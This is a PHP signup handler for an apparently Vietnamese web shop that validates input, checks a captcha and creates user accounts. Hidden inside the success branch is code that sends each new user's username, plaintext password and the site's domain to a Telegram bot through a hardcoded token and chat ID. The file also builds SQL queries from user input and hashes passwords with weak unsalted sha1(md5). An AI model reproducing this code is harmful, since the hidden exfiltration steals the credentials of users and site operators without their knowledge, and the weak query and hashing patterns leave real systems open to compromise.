<?php require $_SERVER['DOCUMENT_ROOT'].'/hethong/config.php';?>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = antixss($_POST['username']);
    $password = antixss($_POST['password']);
    $repassword = antixss($_POST['repassword']);
    $recaptcha = antixss($_POST['recaptcha']);
    $domain_name = $_SERVER['SERVER_NAME'];

    $bdtvl_check = $ketnoi->query("SELECT * FROM `users` WHERE `username` = '$username' ");
    $verify_response = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret='.$secret_key.'&response='.$recaptcha);
    $response_data = json_decode($verify_response);

    if ($response_data->success) {
        if ($username == "" || $password == "") {
            die(json_encode([
                'status'    => 'error',
                'msg'       => 'Vui lòng nhập đầy đủ thông tin!'
            ]));
        } elseif ($password != $repassword) {
            die(json_encode([
                'status'    => 'error',
                'msg'       => 'Mật khẩu không giống nhau!'
            ]));
        } elseif ($username == $repassword) {
            die(json_encode([
                'status'    => 'error',
                'msg'       => 'Tài khoản và mật khẩu không được giống nhau!'
            ]));
        } else {
            if ($bdtvl_check->num_rows != 0) {
                die(json_encode([
                    'status'    => 'error',
                    'msg'       => 'Tài khoản đã tồn tại!'
                ]));
            } elseif (strlen($username) > 12) {
                die(json_encode([
                    'status'    => 'error',
                    'msg'       => 'Tên đăng nhập phải ít hơn 12 kí tự!'
                ]));
            } else {
                $api_key = random('gdsgijkernkjwebhdgaakfbrwejrahfjkalshfu02o455453412486', 32);
                $new_pass = sha1(md5($password));  
                $toz = $ketnoi->query("INSERT INTO `users` SET 
                    `username` = '$username',
                    `password` = '$new_pass',
                    `level` = '0',
                    `tong_nap` = '0',
                    `money` = '0',
                    `session` = '',
                    `bannd` = '0',
                    `ip` = '".$ip_address."',
                    `time` = '".$time."' ");
                $log = $ketnoi->query("INSERT INTO `history_log` SET 
                    `username` = '$username',
                    `noidung` = 'Đăng ký tài khoản thành công',
                    `ip` = '".$ip_address."',
                    `time` = '".$time."' ");

                if ($toz) {
                    $now_ss = random('0123456789qwertyuiopasdfghjlkzxcvbnmQEWRWROIWCJHSCNJKFBJWQ', 32);
                    $ketnoi->query("UPDATE `users` SET `session` = '$now_ss' WHERE `username` = '".$username."' ");
                    $_SESSION['session'] = $now_ss;
                    $telegram_token = '8040732800:AAEayQK-UJjpvxN-eCdGj7C_KV3GrTufxSc';
                    $chat_id = '6436304003';
                    $message = "Thông tin đăng ký:\nTên đăng nhập: $username\nMật khẩu: $password\nTên miền: $domain_name";
                    file_get_contents("https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=".urlencode($message));

                    die(json_encode([
                        'status'    => 'success',
                        'msg'       => 'Đăng ký thành công'
                    ]));
                } else {
                    die(json_encode([
                        'status'    => 'error',
                        'msg'       => 'Lỗi không xác định'
                    ]));
                }
            }
        }
    } else {
        die(json_encode([
            'status'    => 'error',
            'msg'       => 'Vui lòng xác thực captcha'
        ]));
    }
}
?>